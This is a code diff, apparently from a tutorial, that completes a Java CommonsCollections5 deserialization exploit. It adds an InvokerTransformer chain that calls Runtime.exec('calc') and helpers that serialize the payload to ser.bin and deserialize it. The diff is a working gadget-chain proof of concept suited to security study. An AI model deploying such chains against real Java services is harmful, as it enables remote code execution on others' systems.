@@ -48,7 +48,10 @@ public class CommonsCollections5 {
     public static void main(String[] args) throws Exception {
         Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
         Transformer[] realTransformers = new Transformer[]{
-            // ... 同 CC1 的执行链
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
         };
         Transformer transformerChain = new ChainedTransformer(fakeTransformers);
 
@@ -69,6 +72,18 @@ public class CommonsCollections5 {
 
         serialize(bavee);
         unserialize("ser.bin");
+    }
+
+    public static void serialize(Object obj) throws Exception {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(obj);
+        oos.close();
+    }
+
+    public static void unserialize(String filename) throws Exception {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
+        ois.readObject();
+        ois.close();
     }
 }
 ```
